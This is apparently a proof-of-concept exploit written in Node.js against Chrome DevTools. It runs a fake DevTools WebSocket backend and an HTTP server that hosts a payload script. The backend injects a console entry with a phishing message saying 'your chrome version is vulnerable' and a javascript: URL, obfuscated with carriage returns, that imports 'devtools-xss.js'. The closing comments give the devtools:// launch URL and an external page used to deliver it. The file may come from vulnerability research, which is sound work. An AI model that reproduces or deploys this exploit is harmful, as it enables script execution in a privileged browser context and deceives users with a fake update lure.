import { WebSocketServer } from "ws";
import { createServer } from "http";
import finalhandler from "finalhandler";
import serveStatic from "serve-static";

const WebSocket_port = 6123;
const HTTP_port = 9123
const wss = new WebSocketServer({ port: WebSocket_port });

const serve = serveStatic("./");
createServer((req, res) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
    serve(req, res, finalhandler(req, res));
}).listen(HTTP_port);
console.log(`The server is accessible at http://localhost:${HTTP_port}\n--------`);

wss.on("connection", function connection(wss_con) {
    let sent = false;

    console.log("Connection established");
    wss_con.on("message", msg => {
        msg = msg.toString();
        console.log("> ", msg);
        if (sent)
            return;
        wss_con.send(JSON.stringify({
            method: "Log.entryAdded",
            params: {
                entry: {
                source: "network",
                level: "error",
                text: "Your chrome version (117.0.9125.88) is vulnerable to a critical issue! Please click the following link to update it: ",
                timestamp: 1699699328929.153,
                url: "\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\rj\ravascript:import('http://localhost:9123/devtools-xss.js')//  update chrome now",
                networkRequestId: "12597.76"
                }
            }
        }));
        console.log("Sent the malicious event");
        sent = true;
    });
});
// devtools://devtools/bundled/integration_test_runner.html?ws=127.0.0.1:6123&panel=console&inspected_test=https://example.com&debugFrontend=true
// https://dqw.one/chromium/drag-and-drop.html#devtools://devtools/bundled/integration_test_runner.html?ws=127.0.0.1:6123&panel=console&inspected_test=https://example.com&debugFrontend=true
